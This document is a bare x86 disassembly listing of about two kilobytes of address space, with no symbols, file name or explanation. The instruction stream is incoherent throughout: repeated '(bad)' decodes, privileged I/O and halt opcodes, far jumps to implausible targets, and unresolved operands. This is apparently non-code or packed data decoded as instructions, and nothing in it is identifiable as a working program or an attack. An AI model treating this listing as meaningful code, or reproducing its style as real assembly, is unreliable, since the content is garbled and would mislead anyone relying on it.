  417530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417531:	push   edi
  417532:	jae    0x417552
  417534:	push   0xffffff86
  417536:	or     esp,DWORD PTR [eax+ebx*1]
  417539:	(bad)
  41753c:	mov    ebx,0x542676f2
  417541:	push   es
  417542:	sbb    al,0xbe
  417544:	ret    
  417545:	pop    ebx
  417546:	adc    al,0x15
  417548:	leave  
  417549:	jb     0x417568
  41754b:	ins    DWORD PTR es:[edi],dx
  41754c:	int    0x39
  41754e:	lods   eax,DWORD PTR ds:[esi]
  41754f:	addr16 clc 
  417551:	pop    ds
  417552:	scas   eax,DWORD PTR es:[edi]
  417553:	cmp    DWORD PTR [ebx],ecx
  417555:	dec    DWORD PTR [eax]
  417557:	iret   
  417558:	cmp    ch,BYTE PTR ds:0xd4b76ef6
  41755e:	sahf   
  41755f:	dec    ebx
  417560:	mov    ds:0xd14ceaa8,al
  417565:	sbb    DWORD PTR [edi],ebp
  417567:	adc    al,0xa5
  417569:	sub    BYTE PTR [edi+0x4e],ch
  41756c:	xchg   DWORD PTR [edi-0x99cc0cb],ecx
  417572:	push   cs
  417573:	into   
  417574:	pop    ebx
  417575:	test   DWORD PTR [eax-0x337f4493],eax
  41757b:	out    0xc3,al
  41757d:	sub    edx,DWORD PTR [esi]
  41757f:	out    dx,eax
  417580:	js     0x41759f
  417582:	mov    ecx,0x41e0c62a
  417587:	mov    esi,gs
  417589:	(bad)  
  41758a:	fsub   QWORD PTR [edx+0x1216fc55]
  417590:	jae    0x4175b1
  417592:	rol    DWORD PTR [esi+0x7f],cl
  417595:	add    DWORD PTR [eax+0x5b3856e3],0x952d79ce
  41759f:	mov    ?,ecx
  4175a1:	jecxz  0x417557
  4175a3:	mov    WORD PTR [edi+eiz*8+0x575371ba],fs
  4175aa:	push   edx
  4175ab:	dec    esp
  4175ac:	and    al,BYTE PTR [edx]
  4175ae:	es retf 
  4175b0:	jnp    0x4175a2
  4175b2:	mov    ebp,0xf4a74292
  4175b7:	adc    al,BYTE PTR [edi+0x2b]
  4175ba:	rcl    DWORD PTR [edx-0x444ebe43],1
  4175c0:	pop    ds
  4175c1:	mov    esp,DWORD PTR [edx-0x3dde3027]
  4175c7:	hlt    
  4175c8:	and    dh,BYTE PTR [edx]
  4175ca:	stc    
  4175cb:	stc    
  4175cc:	xor    eax,0xd61bd60a
  4175d1:	loope  0x4175ee
  4175d3:	jbe    0x4175b6
  4175d5:	push   edi
  4175d6:	push   esi
  4175d7:	int    0xd1
  4175d9:	xchg   edx,eax
  4175da:	mov    eax,ds:0x1b8a1406
  4175df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175e1:	pop    ebx
  4175e2:	adc    ebp,edi
  4175e4:	xor    BYTE PTR [ebx-0x19],bh
  4175e7:	and    cl,dh
  4175e9:	or     al,0x78
  4175eb:	(bad)  
  4175ec:	mov    gs,WORD PTR [edx-0x69]
  4175ef:	mov    bl,0xfd
  4175f1:	repnz cbw 
  4175f4:	jl     0x417650
  4175f6:	pop    esi
  4175f7:	jl     0x417630
  4175f9:	push   ecx
  4175fa:	inc    ebp
  4175fb:	cmp    edi,DWORD PTR [ebx]
  4175fd:	not    DWORD PTR [eax]
  4175ff:	stos   DWORD PTR es:[edi],eax
  417600:	cmp    al,0x82
  417602:	mov    dl,0xa2
  417604:	push   0x7f
  417606:	out    dx,eax
  417607:	or     eax,0x67e2b1fc
  41760c:	rcl    BYTE PTR [eax+0x1c7fb5b],1
  417612:	jmp    0x465fe82d
  417617:	pop    esp
  417618:	inc    DWORD PTR [eax+0x7]
  41761b:	in     al,0x7c
  41761d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41761e:	call   DWORD PTR [edx]
  417620:	jb     0x41760c
  417622:	cs xchg edx,eax
  417624:	jae    0x41765b
  417626:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417627:	mov    cl,0x9c
  417629:	hlt    
  41762a:	loopne 0x417680
  41762c:	xchg   ebx,eax
  41762d:	push   edi
  41762e:	imul   ebp,eax,0x54
  417631:	ficom  WORD PTR [eax+0x65]
  417634:	push   cs
  417635:	bound  ecx,QWORD PTR [ecx+ebx*1]
  417638:	add    eax,0xca77d2b8
  41763d:	daa    
  41763e:	add    BYTE PTR [ecx+0x4b],cl
  417641:	aaa    
  417642:	arpl   WORD PTR [ecx+0x2b5869bb],cx
  417648:	pop    eax
  417649:	fst    DWORD PTR [edx-0xc5bb2fd]
  41764f:	mov    bh,0x8b
  417651:	cmp    dh,BYTE PTR ds:0x386cb715
  417657:	push   ecx
  417658:	mov    al,BYTE PTR ds:0xc826c1e
  41765e:	jmp    0x433:0x7154cc2a
  417665:	or     ebx,DWORD PTR [esp+esi*4-0x7eb8d699]
  41766c:	jmp    0x258444bd
  417671:	daa    
  417672:	std    
  417673:	jns    0x4175f9
  417675:	or     al,al
  417677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417678:	push   es
  417679:	cmp    cl,BYTE PTR [edx]
  41767b:	mov    edi,0xb8d833d5
  417680:	sub    al,al
  417682:	jg     0x4176b1
  417684:	mov    edx,0xe1252ba1
  417689:	loop   0x4176ce
  41768b:	jmp    0xefc7848f
  417690:	sub    eax,edx
  417692:	ret    
  417693:	into   
  417694:	hlt    
  417695:	dec    esp
  417696:	push   esi
  417697:	xlat   BYTE PTR ds:[ebx]
  417698:	in     al,0x5d
  41769a:	dec    esi
  41769b:	mov    bl,0x44
  41769d:	or     edi,esi
  41769f:	popa   
  4176a0:	fisubr WORD PTR [edx+0x27]
  4176a3:	scas   eax,DWORD PTR es:[edi]
  4176a4:	in     eax,0xd5
  4176a6:	or     ecx,ebp
  4176a8:	and    esp,edx
  4176aa:	sahf   
  4176ab:	mov    edx,0x5e7ca21f
  4176b0:	xchg   ebx,eax
  4176b1:	outs   dx,DWORD PTR ds:[esi]
  4176b2:	inc    esi
  4176b3:	xor    al,0xb7
  4176b5:	inc    ecx
  4176b6:	mov    ebp,edx
  4176b8:	in     eax,0x19
  4176ba:	(bad)  
  4176bc:	leave  
  4176bd:	xor    BYTE PTR [edx+0x5738a4bd],0x3c
  4176c4:	aam    0xc8
  4176c6:	mov    DWORD PTR [eax+0x5e],ebx
  4176c9:	(bad)  
  4176ca:	imul   esp,ecx,0x413c56c9
  4176d0:	adc    al,0xe7
  4176d2:	jnp    0x4176d8
  4176d4:	inc    esp
  4176d5:	loopne 0x4176d3
  4176d7:	sbb    eax,0xde361349
  4176dc:	dec    edi
  4176dd:	mov    bl,0x8c
  4176df:	idiv   DWORD PTR [edx-0x526d4aef]
  4176e5:	ja     0x4176b1
  4176e7:	and    al,0xb3
  4176e9:	dec    edx
  4176ea:	xchg   esi,eax
  4176eb:	rol    esi,0xb6
  4176ee:	pop    ss
  4176ef:	inc    ebp
  4176f0:	leave  
  4176f1:	vhaddps xmm0,xmm4,xmm3
  4176f5:	and    eax,0x1354f98d
  4176fa:	(bad)  
  4176fb:	fisub  WORD PTR [edx]
  4176fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176fe:	mov    ch,0xcb
  417700:	xor    DWORD PTR [ecx-0x12],esp
  417703:	fldenv [ebx-0x6e]
  417706:	scas   al,BYTE PTR es:[edi]
  417707:	mov    WORD PTR [ecx+esi*1+0x24],ss
  41770b:	xor    eax,0x5b8a7167
  417710:	xchg   ecx,eax
  417711:	and    dh,BYTE PTR [esi-0x32]
  417714:	pushf  
  417715:	stc    
  417716:	xchg   edi,eax
  417717:	imul   eax,DWORD PTR [edx],0x6d
  41771a:	(bad)  
  41771c:	ds out dx,al
  41771e:	in     eax,dx
  41771f:	enter  0xc218,0x8c
  417723:	mov    ecx,0x16bd1c66
  417728:	jno    0x417771
  41772a:	mov    ecx,DWORD PTR [esi+0x3e846251]
  417730:	mov    cl,0xb1
  417732:	mov    cl,0x4c
  417734:	mov    ds:0x948b8a8a,al
  417739:	loope  0x41770a
  41773b:	rol    eax,1
  41773d:	fmul   DWORD PTR [esi-0x13]
  417740:	setl   BYTE PTR cs:[esi]
  417744:	mov    bh,0x4f
  417746:	cmp    ebx,0x70665fa0
  41774c:	rcr    BYTE PTR [ebx],0xa6
  41774f:	push   es
  417750:	and    DWORD PTR [edi+0x31],esp
  417753:	add    eax,DWORD PTR ds:0x3b4333e9
  417759:	fstp   st(7)
  41775b:	mov    al,0x1a
  41775d:	cs mov edx,0x4e7c3e9b
  417763:	jae    0x417783
  417765:	and    al,0xa9
  417767:	es test eax,0x7e1913de
  41776d:	fadd   DWORD PTR [ebp-0x7]
  417770:	jmp    0x4177f1
  417772:	add    al,0xbe
  417774:	xchg   BYTE PTR [ecx+ecx*8],ah
  417777:	test   eax,0xc469154a
  41777c:	push   es
  41777d:	sbb    eax,0x35556409
  417782:	mov    ebp,0xd2c3402a
  417787:	stc    
  417788:	fmul   st(4),st
  41778a:	ror    DWORD PTR [eax+0x70991194],1
  417790:	xchg   ecx,eax
  417791:	iret   
  417792:	neg    BYTE PTR [eax+ecx*2-0x72]
  417796:	(bad)  
  417797:	mov    esp,0x6cc6a7c5
  41779c:	xor    DWORD PTR [ecx+0x11792aae],ebp
  4177a2:	push   cs
  4177a3:	jge    0x4177ac
  4177a5:	ds adc al,0x2d
  4177a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177a9:	jmp    0x417820
  4177ab:	add    edi,DWORD PTR [edx-0x33]
  4177ae:	adc    bl,bl
  4177b0:	mov    WORD PTR [ecx+ebx*2+0xa],es
  4177b4:	push   esp
  4177b5:	call   0x33b9d71c
  4177ba:	cmp    dl,BYTE PTR [edx+edx*8-0x28a1b51b]
  4177c1:	leave  
  4177c2:	scas   eax,DWORD PTR es:[edi]
  4177c3:	xchg   ecx,eax
  4177c4:	(bad)  
  4177c5:	and    al,dl
  4177c7:	jmp    0xdf1db83c
  4177cc:	dec    BYTE PTR [edi-0x26]
  4177cf:	add    eax,0x6d020c9f
  4177d4:	adc    edx,0xdf42dafe
  4177da:	das    
  4177db:	fwait
  4177dc:	aad    0x66
  4177de:	mov    ebp,0x4ed695aa
  4177e3:	popf   
  4177e4:	out    0xfc,al
  4177e6:	js     0x4177de
  4177e8:	cld    
  4177e9:	fs jns 0x417780
  4177ec:	xchg   esp,eax
  4177ed:	xchg   BYTE PTR [ebx+0x66],bl
  4177f0:	jno    0x4177b8
  4177f2:	retf   
  4177f3:	push   ds
  4177f4:	push   0x4e
  4177f6:	adc    ah,BYTE PTR ds:0x2d1de585
  4177fc:	gs jo  0x417792
  4177ff:	nop
  417800:	ret    
  417801:	pop    ebp
  417802:	psubw  xmm4,XMMWORD PTR [edx-0xb]
  417807:	test   al,0x72
  417809:	mov    bl,0xa7
  41780b:	mov    ch,0x77
  41780d:	es mov bh,dh
  417810:	data16 daa 
  417812:	retf   
  417813:	cwde   
  417814:	clc    
  417815:	inc    esp
  417816:	rcr    ah,cl
  417818:	push   0x2
  41781a:	leave  
  41781b:	lock retf 0xdde3
  41781f:	push   ss
  417820:	ins    BYTE PTR es:[edi],dx
  417821:	js     0x4177a4
  417823:	int3   
  417824:	mov    WORD PTR [eax-0x7d],fs
  417827:	push   ecx
  417828:	push   cs
  417829:	(bad)  
  41782a:	out    dx,eax
  41782b:	push   esi
  41782c:	add    dh,dl
  41782e:	push   ecx
  41782f:	neg    BYTE PTR [edx+eiz*1+0x25]
  417833:	ja     0x41782c
  417835:	icebp  
  417836:	adc    al,BYTE PTR [edi+ebx*8-0x4568d307]
  41783d:	js     0x41784d
  41783f:	stos   BYTE PTR es:[edi],al
  417840:	shr    DWORD PTR [ecx+0x17],0x58
  417844:	lds    edx,FWORD PTR [ecx-0x2a0e1f56]
  41784a:	add    bh,BYTE PTR ds:0x1fdb1033
  417850:	and    eax,DWORD PTR [esi]
  417852:	enter  0xa0ed,0xcb
  417856:	ror    BYTE PTR [eax-0x69],1
  417859:	(bad)  
  41785a:	ja     0x4178b4
  41785c:	dec    edx
  41785d:	ins    BYTE PTR es:[edi],dx
  41785e:	add    bh,dh
  417860:	pop    eax
  417861:	cmp    eax,0x19a7abf9
  417866:	inc    esi
  417867:	sti    
  417868:	dec    ebp
  417869:	sub    dl,al
  41786b:	shl    BYTE PTR [ecx+0x35bb6e78],1
  417871:	sar    BYTE PTR [esi-0x1dea8323],cl
  417877:	dec    edx
  417878:	pushf  
  417879:	ja     0x417830
  41787b:	mov    DWORD PTR [edi-0x63],ecx
  41787e:	icebp  
  41787f:	xchg   ebp,eax
  417880:	mov    ebp,0xfd5cc836
  417885:	push   edi
  417886:	mov    ch,0xce
  417888:	repz inc ecx
  41788a:	pusha  
  41788b:	xchg   esi,eax
  41788c:	pop    edi
  41788d:	mov    bh,ah
  41788f:	popa   
  417890:	out    0x85,al
  417892:	jp     0x4178f7
  417894:	in     al,0x47
  417896:	lock push eax
  417898:	xor    eax,0x1bfdf71d
  41789d:	jne    0x41785c
  41789f:	xor    al,0x98
  4178a1:	wbinvd 
  4178a3:	xor    eax,0xcb204567
  4178a8:	cmp    eax,0x1f5474eb
  4178ad:	mov    edx,0x19abad57
  4178b2:	jle    0x417926
  4178b4:	xchg   esp,eax
  4178b5:	sbb    eax,0xe6697204
  4178ba:	sbb    al,0xc2
  4178bc:	sub    dl,BYTE PTR [ebx-0x8]
  4178bf:	mov    edx,0xdc7aeb6d
  4178c4:	mov    ds:0xcfd47fb0,al
  4178c9:	inc    DWORD PTR [ebp-0x58]
  4178cc:	(bad)  
  4178cd:	sub    DWORD PTR [eax+0x1b],ecx
  4178d0:	(bad)  
  4178d1:	rcl    bl,1
  4178d3:	cmp    eax,0x129c022
  4178d8:	scas   eax,DWORD PTR es:[edi]
  4178d9:	pop    edx
  4178da:	xor    BYTE PTR [ebx-0x26],ah
  4178dd:	pop    edx
  4178de:	cmp    cl,BYTE PTR [edx+0x19]
  4178e1:	lock mov edx,0x6b9389a0
  4178e7:	or     dl,cl
  4178e9:	aam    0xdb
  4178eb:	test   eax,0x20abb75
  4178f0:	jl     0x417907
  4178f2:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4178f4:	and    BYTE PTR [edi],cl
  4178f6:	shr    ebp,cl
  4178f8:	and    dh,0xc4
  4178fb:	add    BYTE PTR [eax],al
  4178fd:	mov    ecx,0xe187211a
  417902:	push   0x7e
  417904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417905:	or     esi,DWORD PTR ds:0x7a83a6e3
  41790b:	cmp    DWORD PTR [ebx+0x64396762],esp
  417911:	mov    WORD PTR [esi+ebp*2],?
  417914:	lods   al,BYTE PTR ds:[esi]
  417915:	push   0x59
  417917:	clc    
  417918:	or     DWORD PTR [edx],edi
  41791a:	inc    ebx
  41791b:	inc    ebp
  41791c:	or     ah,BYTE PTR [ebp+0x6e]
  41791f:	sub    esp,esp
  417921:	pop    edi
  417922:	xchg   DWORD PTR [ebp+0xf],eax
  417925:	jnp    0x41791d
  417927:	xchg   cl,ah
  417929:	mov    bl,0x58
  41792b:	add    eax,0xd58cb1d7
  417930:	push   ss
  417931:	ror    BYTE PTR [ebx],0xd5
  417934:	add    edx,esi
  417936:	push   ebp
  417937:	xchg   DWORD PTR [ebp-0x75],edx
  41793a:	and    ecx,0x616ca545
  417940:	pop    esp
  417941:	nop
  417942:	in     eax,dx
  417943:	loop   0x417965
  417945:	or     ecx,ebp
  417947:	cli    
  417948:	or     bh,ah
  41794a:	inc    ecx
  41794b:	mov    dh,dh
  41794d:	push   eax
  41794e:	inc    eax
  41794f:	sub    ebp,esp
  417951:	sbb    ah,BYTE PTR [edx]
  417953:	mov    BYTE PTR [edi],dh
  417955:	(bad)  
  417956:	xchg   ebp,eax
  417957:	jns    0x4178f5
  417959:	or     DWORD PTR [edi+0x737db08f],eax
  41795f:	loop   0x41790a
  417961:	jecxz  0x417951
  417963:	aad    0x5c
  417965:	rol    DWORD PTR [edx-0x1dc6055e],cl
  41796b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41796c:	sub    eax,0xaa2d6181
  417971:	in     eax,dx
  417972:	xchg   esi,eax
  417973:	adc    al,dl
  417975:	cmp    ah,ch
  417977:	add    eax,DWORD PTR [ebp+0x45ca2874]
  41797d:	cmp    DWORD PTR [edx+0x24],eax
  417980:	lea    ebp,[ebp+0xa]
  417983:	mov    edi,0xe2a17a11
  417988:	mov    eax,0xed1c5dd3
  41798d:	cmp    eax,0xe4b2f813
  417992:	lea    esp,[edx-0x30]
  417995:	mov    eax,0xc1a7970b
  41799a:	jnp    0x417994
  41799c:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41799e:	adc    BYTE PTR [esi],dh
  4179a0:	adc    eax,0x290f436
  4179a5:	in     eax,0xd3
  4179a7:	ds daa 
  4179a9:	(bad)  
  4179ab:	xor    eax,DWORD PTR [ecx-0x6]
  4179ae:	jp     0x4179f9
  4179b0:	iret   
  4179b1:	jp     0x417980
  4179b3:	xor    al,0xcc
  4179b5:	mov    ds:0xc712607d,al
  4179ba:	sub    bl,BYTE PTR [ecx-0x2c79d215]
  4179c0:	or     ebx,eax
  4179c2:	and    DWORD PTR [eax],edi
  4179c4:	mov    ah,0x69
  4179c6:	xchg   ebp,eax
  4179c7:	lds    ebx,FWORD PTR [edi]
  4179c9:	add    BYTE PTR [eax-0x13],dl
  4179cc:	xor    esp,DWORD PTR [eax]
  4179ce:	sub    al,0xc
  4179d0:	and    eax,DWORD PTR [edx-0x72]
  4179d3:	mov    edx,0xacc0caa6
  4179d8:	ror    esp,1
  4179da:	lea    edx,[ebp+0x78b59fe7]
  4179e0:	lock jle 0x41797d
  4179e3:	and    bl,bl
  4179e5:	enter  0x787c,0x59
  4179e9:	bound  ebp,QWORD PTR [ecx+0x4c]
  4179ec:	cmp    BYTE PTR [edx],bh
  4179ee:	pop    ss
  4179ef:	adc    DWORD PTR [eax-0x6dea8e94],0x575c63b7
  4179f9:	sbb    DWORD PTR [esi],esp
  4179fb:	xchg   edx,eax
  4179fc:	mov    al,ds:0xbd04c520
  417a01:	and    al,0x83
  417a03:	inc    ebp
  417a04:	hlt    
  417a05:	sub    eax,DWORD PTR [ebx-0x32]
  417a08:	loopne 0x417a69
  417a0a:	and    edx,edx
  417a0c:	push   0x75
  417a0e:	pop    edx
  417a0f:	sbb    esi,DWORD PTR [ecx+esi*4]
  417a12:	sar    BYTE PTR ds:0xb5fcd8b9,1
  417a18:	xchg   esp,eax
  417a19:	lock dec esi
  417a1b:	jb     0x417a5b
  417a1d:	outs   dx,BYTE PTR ds:[esi]
  417a1e:	iret   
  417a1f:	(bad)  
  417a20:	push   cs
  417a21:	in     eax,dx
  417a22:	test   al,0x46
  417a24:	test   esp,ebx
  417a26:	stos   DWORD PTR es:[edi],eax
  417a27:	test   eax,0x198973c9
  417a2c:	inc    esp
  417a2d:	adc    al,ch
  417a2f:	dec    eax
  417a30:	addr16 xor al,0xf9
  417a33:	mov    bl,BYTE PTR [ebx-0x11514ef0]
  417a39:	imul   esi,DWORD PTR [ebp+0x4a],0xc87e49dd
  417a40:	inc    esp
  417a41:	daa    
  417a42:	and    DWORD PTR [edx-0x537627a7],eax
  417a48:	sub    BYTE PTR [esi+edi*4-0x28958cba],0x47
  417a50:	push   ss
  417a51:	leave  
  417a52:	addr16 (bad) 
  417a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a55:	fisub  DWORD PTR [edx]
  417a57:	hlt    
  417a58:	mov    ?,WORD PTR [ecx-0x3d025d5d]
  417a5e:	cmp    ah,BYTE PTR [ebx-0x839e462]
  417a64:	test   al,0x16
  417a66:	push   ss
  417a67:	mov    ecx,0x3220a9d0
  417a6c:	ja     0x417a58
  417a6e:	imul   ebx,DWORD PTR [eax-0x46],0xa7dbd6e0
  417a75:	sub    eax,0xa85c66c3
  417a7a:	and    cl,dl
  417a7c:	push   ss
  417a7d:	inc    ebp
  417a7e:	and    bh,BYTE PTR [ecx]
  417a80:	sbb    eax,ecx
  417a82:	sub    dh,ah
  417a84:	sub    bh,BYTE PTR [edi+0x61]
  417a87:	mov    ebx,0x8f6bd108
  417a8c:	sbb    al,0x52
  417a8e:	jecxz  0x417a28
  417a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a91:	adc    eax,ebp
  417a93:	xchg   esi,eax
  417a94:	pop    es
  417a95:	pop    ds
  417a96:	inc    eax
  417a97:	mov    WORD PTR [ebp+0x79dc3a9f],?
  417a9d:	mov    cl,0x1
  417a9f:	xchg   ecx,eax
  417aa0:	sub    BYTE PTR [edi],al
  417aa2:	out    0x7b,eax
  417aa4:	aad    0x5b
  417aa6:	sbb    bl,BYTE PTR [edx+0x13]
  417aa9:	adc    BYTE PTR [ebx+edi*8],bh
  417aac:	push   0xef3e05db
  417ab1:	or     dl,BYTE PTR [edi+esi*1-0x14]
  417ab5:	xor    BYTE PTR [esi],cl
  417ab7:	xchg   ecx,eax
  417ab8:	add    DWORD PTR [eax+ecx*4-0x7bbe1495],edx
  417abf:	ret    
  417ac0:	mov    ds:0xd262dbe6,eax
  417ac5:	add    DWORD PTR [eax+ecx*2+0x5d44e986],edi
  417acc:	ret    
  417acd:	bnd jmp DWORD PTR [ebx+0x3be37293]
  417ad4:	xor    DWORD PTR [esi],esi
  417ad6:	jmp    0x1e63:0x1c50a50e
  417add:	pop    esi
  417ade:	add    DWORD PTR [esi+0x524278e],ecx
  417ae4:	rcr    DWORD PTR [eax+eiz*1-0xfdce473],0xa2
  417aec:	(bad)
  417aef:	xchg   DWORD PTR [ecx],edi
  417af1:	mov    cl,0x8c
  417af3:	ss aam 0x37
  417af6:	xchg   edi,eax
  417af7:	push   edi
  417af8:	xchg   edx,eax
  417af9:	sbb    ah,bl
  417afb:	push   ds
  417afc:	popa   
  417afd:	retf   0xe1d1
  417b00:	frstor [esi-0x11]
  417b03:	push   ss
  417b04:	lods   eax,DWORD PTR ds:[esi]
  417b05:	or     BYTE PTR [edi-0x3fe93dd5],al
  417b0b:	jecxz  0x417b2c
  417b0d:	fldcw  WORD PTR [ebp+0x6c0896ee]
  417b13:	inc    edx
  417b14:	pop    es
  417b15:	or     ah,BYTE PTR [ebx-0x77c73dc2]
  417b1b:	(bad)  
  417b1c:	jmp    0x28b1367d
  417b21:	sbb    BYTE PTR [ecx+0x6b],ch
  417b24:	sti    
  417b25:	and    BYTE PTR [edx-0x6dae9920],dl
  417b2b:	into   
  417b2c:	hlt    
  417b2d:	xor    DWORD PTR [edi-0x26ca7809],esi
  417b33:	push   ds
  417b34:	lods   eax,DWORD PTR ds:[esi]
  417b35:	sub    BYTE PTR [ebx],0xf
  417b38:	and    DWORD PTR [edx-0x46],ebp
  417b3b:	or     ah,cl
  417b3d:	imul   ebx,DWORD PTR [ecx-0x40bcc812],0x41f0b8f
  417b47:	mov    edi,0x8e0c4abd
  417b4c:	sbb    DWORD PTR [esi-0x75],ebp
  417b4f:	cmp    DWORD PTR [ebp-0x5c],esp
  417b52:	aam    0x8e
  417b54:	add    bh,ah
  417b56:	pop    ss
  417b57:	pop    es
  417b58:	aaa    
  417b59:	loop   0x417adb
  417b5b:	xchg   BYTE PTR [edi+0x69a9d9bf],ah
  417b61:	cdq    
  417b62:	mov    al,0x3a
  417b64:	pop    edx
  417b65:	sub    DWORD PTR [edx+0x750fc735],0x27
  417b6c:	sub    BYTE PTR [edx-0x7a],bh
  417b6f:	or     esp,ebx
  417b71:	sub    al,0xbb
  417b73:	lods   al,BYTE PTR ds:[esi]
  417b74:	test   al,0xc4
  417b76:	scas   al,BYTE PTR es:[edi]
  417b77:	dec    ebp
  417b78:	call   0x5f23:0x67ca435f
  417b7f:	add    ebx,DWORD PTR [ecx+edi*4-0x58]
  417b83:	xchg   BYTE PTR [esi+0x4d],al
  417b86:	push   esp
  417b87:	sbb    BYTE PTR [ebx-0x416c4d21],0x3c
  417b8e:	(bad)  
  417b8f:	sahf   
  417b90:	pop    eax
  417b91:	js     0x417bd9
  417b93:	xchg   esi,eax
  417b94:	aaa    
  417b95:	imul   DWORD PTR [ecx]
  417b97:	les    esi,FWORD PTR [ebx-0x4b]
  417b9a:	pxor   mm3,QWORD PTR [edx+0x2e7c594e]
  417ba1:	fisttp WORD PTR [edi+0x2df916fd]
  417ba7:	xor    BYTE PTR [edx+edi*1],al
  417baa:	add    al,0x73
  417bac:	xchg   BYTE PTR [eax],dh
  417bae:	mov    WORD PTR [esi-0x5b5a1e4b],?
  417bb4:	sub    bh,BYTE PTR [ebp-0x40]
  417bb7:	into   
  417bb8:	xchg   DWORD PTR [esi-0x13],edx
  417bbb:	mov    eax,0xcb5677c9
  417bc0:	adc    DWORD PTR [edx-0xf07fc59],edx
  417bc6:	cmc    
  417bc7:	test   DWORD PTR [ebx+0x5a9578c8],esi
  417bcd:	pusha  
  417bce:	push   ecx
  417bcf:	enter  0x9e51,0xbc
  417bd3:	xchg   edx,eax
  417bd4:	dec    ecx
  417bd5:	aam    0x9a
  417bd7:	call   0x8b65:0xc8baf045
  417bde:	xor    esp,0xf765e6d5
  417be4:	sub    eax,0x2da9e4d1
  417be9:	das    
  417bea:	icebp  
  417beb:	cli    
  417bec:	data16 loopne 0x417b99
  417bef:	mov    bl,0xd8
  417bf1:	dec    esp
  417bf2:	sbb    eax,0x18b1b479
  417bf7:	dec    ecx
  417bf8:	dec    ebp
  417bf9:	dec    esi
  417bfa:	mov    gs,WORD PTR [ecx+0x5c]
  417bfd:	mov    ds:0x7b61fbbe,eax
  417c02:	cmp    esp,DWORD PTR ds:0x34ce908c
  417c08:	cmc    
  417c09:	nop
  417c0a:	push   0x5d
  417c0c:	bound  esp,QWORD PTR [ecx+0x7f95ca00]
  417c12:	out    0x4c,eax
  417c14:	mov    bh,0xee
  417c16:	test   dl,dl
  417c18:	mov    ebp,0xc3204df3
  417c1d:	mov    ebp,0xa1e948de
  417c22:	add    BYTE PTR [esi+eiz*1],al
  417c25:	xchg   edi,eax
  417c26:	mov    esi,esi
  417c28:	mov    eax,0xc930faf5
  417c2d:	jns    0x417bed
  417c2f:	test   eax,0x9ed3ba87
  417c34:	ret    
  417c35:	jle    0x417c84
  417c37:	jle    0x417c2d
  417c39:	jns    0x417c93
  417c3b:	scas   eax,DWORD PTR es:[edi]
  417c3c:	cmp    al,BYTE PTR [edx+eax*1]
  417c3f:	aas    
  417c40:	data16 in al,0x67
  417c43:	xor    BYTE PTR [ecx-0x57],ch
  417c46:	and    BYTE PTR [ebx],0xcf
  417c49:	ret    0x70bd
  417c4c:	lock add DWORD PTR [ebx+0x4430009],ecx
  417c53:	mov    ds:0xc81d61fc,eax
  417c58:	or     BYTE PTR [edx],al
  417c5a:	push   ebp
  417c5b:	icebp  
  417c5c:	jecxz  0x417c53
  417c5e:	mov    edi,0x18c968b8
  417c63:	push   ds
  417c64:	jno    0x417c8e
  417c66:	mov    eax,ds:0xdb1de269
  417c6b:	sbb    al,0x48
  417c6d:	sub    DWORD PTR [ecx*1-0x64797ed8],ebp
  417c74:	sub    eax,0x6eeb95d
  417c79:	mov    ds:0x98c59b3d,al
  417c7e:	mov    cl,0x5e
  417c80:	jno    0x417cd0
  417c82:	push   ebx
  417c83:	pop    ebp
  417c84:	pop    esp
  417c85:	push   esp
  417c86:	cdq    
  417c87:	cwde   
  417c88:	popa   
  417c89:	jl     0x417c59
  417c8b:	bound  edx,QWORD PTR [edx+0x58caebd9]
  417c91:	jb     0x417c7b
  417c93:	jae    0x417c4b
  417c95:	pop    edi
  417c96:	or     al,bh
  417c98:	mov    DWORD PTR [edx+0x56b8e65c],eax
  417c9e:	mov    ds:0x5eb317d5,eax
  417ca3:	mov    DWORD PTR [esi],edx
  417ca5:	imul   esp,DWORD PTR [ebx-0x4f45ce1d],0x56ad80e
  417caf:	lahf   
  417cb0:	gs je  0x417c84
  417cb3:	imul   esp,edx,0xda737f96
  417cb9:	nop
  417cba:	daa    
  417cbb:	inc    ebp
  417cbc:	pop    edx
  417cbd:	mov    cl,0xfa
  417cbf:	hlt    
  417cc0:	dec    ebp
  417cc1:	sbb    BYTE PTR [ebx],0x83
  417cc4:	(bad)  
  417cc5:	mov    BYTE PTR [esi+0x5c78f14c],dh
  417ccb:	into   
  417ccc:	sti    
  417ccd:	jp     0x417d0c
  417ccf:	jo     0x417cc5
  417cd1:	pop    edx
  417cd2:	stos   BYTE PTR es:[edi],al
  417cd3:	loopne 0x417d2b
  417cd5:	add    dl,BYTE PTR [ebx]
  417cd7:	mov    al,ds:0xf1fcecd
  417cdc:	and    esi,DWORD PTR [ebp+0x1c]
  417cdf:	cmp    ecx,DWORD PTR ds:0xbc04c2c0
  417ce5:	int    0x43
  417ce7:	sbb    BYTE PTR [edx+0x5c],ah
  417cea:	enter  0xfc59,0xd
  417cee:	jne    0x417ca8
  417cf0:	mov    edi,0x31d9ab72
  417cf5:	or     al,0x4c
  417cf7:	jb     0x417cb5
  417cf9:	imul   esi,DWORD PTR [edx],0xffffffe7
  417cfc:	mov    al,0x35
  417cfe:	cmc    
  417cff:	inc    eax
  417d00:	jmp    0x14b68f86
  417d05:	in     al,dx
  417d06:	test   al,0x51
  417d08:	ins    DWORD PTR es:[edi],dx
  417d09:	xor    al,BYTE PTR [edi+0x56333def]
  417d0f:	xchg   esp,eax
  417d10:	mov    edx,0xf9195526
  417d15:	xor    esi,eax
  417d17:	cmp    eax,0x87419832
  417d1c:	scas   al,BYTE PTR es:[edi]
  417d1d:	sub    BYTE PTR [edx+0x6f],0x79
  417d21:	cs jmp 0x6826a1fd
  417d27:	sti    
  417d28:	or     ah,BYTE PTR [edi-0x1e788892]
  417d2e:	cmp    eax,0x526bad84
